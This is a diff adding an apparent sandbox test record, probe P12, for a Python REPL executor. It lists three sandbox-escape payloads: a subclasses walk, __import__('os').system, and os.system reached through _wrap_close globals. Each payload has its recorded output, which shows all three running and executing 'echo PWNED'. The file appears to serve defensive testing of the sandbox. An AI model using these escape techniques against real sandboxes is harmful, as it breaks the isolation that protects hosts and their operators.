@@ -1,0 +1,23 @@
+probe: P12
+code (python, run through LocalREPL.execute_code):
+# P12a spec: subclasses walk
+subs = ().__class__.__base__.__subclasses__()
+print(len(subs))
+
+# P12b spec: __import__ os system
+print(__import__("os").system("echo PWNED"))
+
+# P12c spec: os._wrap_close globals -> system
+wc = [c for c in ().__class__.__base__.__subclasses__() if c.__name__ == '_wrap_close']
+print(len(wc))
+print(wc[0].__init__.__globals__['system']('echo PWNED2'))
+host_calls_so_far: 0
+
+# P12a spec: subclasses walk
+ok=True stdout='428\n' stderr='' error=None
+
+# P12b spec: __import__ os system
+ok=True stdout='0\n' stderr='' error=None
+
+# P12c spec: os._wrap_close globals -> system
+ok=True stdout='1\n0\n' stderr='' error=None
